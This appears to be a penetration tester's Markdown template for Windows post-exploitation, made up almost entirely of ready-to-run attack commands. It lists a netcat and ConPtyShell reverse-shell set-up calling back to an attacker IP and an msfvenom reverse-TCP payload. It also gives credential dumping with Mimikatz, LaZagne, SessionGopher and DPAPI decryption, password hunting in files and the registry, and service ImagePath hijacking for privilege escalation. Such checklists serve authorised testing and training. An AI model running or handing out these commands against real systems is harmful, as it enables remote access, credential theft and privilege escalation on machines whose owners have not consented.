Template version: 2025.11.07
### RDP / WinRM Access:

---
### Shell Upgrade:
**ConPtyShell:**
- Host: `stty raw -echo; (stty size; cat) | nc -lvnp 8001`
- Target: `Start-Job -ScriptBlock {.\ConPtyShell.exe <IP> 8001}`

**MSFVenom:**
- NC: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=8001 -f exe -o shell.exe`

---
### User Groups & Privileges:
###### Groups:
- `whoami /groups`
- Ref: `90 Helpers/Common Payloads/Windows & Active Directory`
```

```
###### Tokens/Privileges:
- `whoami /priv`
- Ref: https://github.com/gtworek/Priv2Admin
- Ref: `90 Helpers/Common Payloads/Windows & Active Directory`
```

```

---
### User Home Directory:
```

```

---
### Environment Variables:
- `cmd /c set`

---
### Stored Credentials:
- `cmdkey /list`
- Mimikatz: `sekurlsa::logonpasswords`

---
### Credential Scan - LaZagne:
- GitHub: https://github.com/AlessandroZ/LaZagne 
- Command: `.\lazagne.exe all`

---
### Credential Scan - SessionGopher
- GitHub: https://github.com/Arvanaghi/SessionGopher
- Command: . .\SessionGopher.ps1`; `Invoke-SessionGopher -Thorough`

---
### DPAPI Secrets:
###### References:
- https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets 
###### Master key path:
- `C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID`
###### Credentials path:
- `C:\Users\$USER\AppData\Local\Microsoft\Credentials\`
- `C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\`
###### Offline decryption:
- Master key decrypt: `impacket-dpapi masterkey -file <masterkey> -sid <sid> -password '<password>'`
- Secret decrypt: `impacket-dpapi credential -file <secret> -key <masterkey>`

---
### Startup Programs:
- `Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl`

---
### Named Pipes:
###### Commands:
- CMD: `pipelist.exe /accepteula`
- PowerShell: `gci \\.\pipe\`
- Access check: `accesschk.exe /accepteula \\.\Pipe\<pipe> -v`

---
### History / Sensitive Files:
- [ ] PowerShell History: `dir /s /b c:\consolehost_history.txt`; `(Get-PSReadlineOption).HistorySavePath`; `Get-History`
- [ ] KeePass: `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
- [ ] Sticky Notes: `dir /s /b c:\plum.sqlite`
- [ ] Other file types: `txt`, `pdf`, `xls`, `xlsx`, `doc`, `docx`

---
### Config Files & Scripts:
- [ ] Web config: `Get-ChildItem -Path c:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
- [ ] Config Files:`dir /S /B /A:-D C:\<dir>\*config* 2>nul`

---
### Credentials Hunting:
- [ ] `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.conf *.xml`
- [ ] `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`
- [ ] `reg query HKCU\Software\SimonTatham\PuTTY\Sessions\<session>`

---
### Automated Scan - WinPEAS:
- GitHub: https://github.com/peass-ng/PEASS-ng/tree/master

---
### Automated Scan - JAWS:
- GitHub: https://github.com/411Hall/JAWS
- Command: `powershell -ep bypass`; `.\jaws-enum.ps1 [-OutputFilename jaws.txt]`

---
### Automated Scan - SeatBelt:
- GitHub: https://github.com/GhostPack/Seatbelt
- Pre-compiled binary: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

---
### Automated Scan - SharpUp:
- GitHub: https://github.com/GhostPack/SharpUp
- Pre-compiled binary: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
- Command: `.\SharpUp.exe audit`; `.\SharpUp.exe <check>` (check lists in GitHub page)

---
### Registry Query:
###### General:
- `reg query hklm`
###### Weak Service ACL:
- Check: `accesschk.exe /accepteula <user> -kvuqsw HKLM\System\CurrentControlSet\Services`
- Change image path: `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<service> -Name "ImagePath" -Value "<payload>`
###### Always Install Elevated:
- `reg query HKCU\Software\Policies\Microsoft\Windows\Installer` => 1
- `reg query HKLM\Software\Policies\Microsoft\Windows\Installer` => 1

---
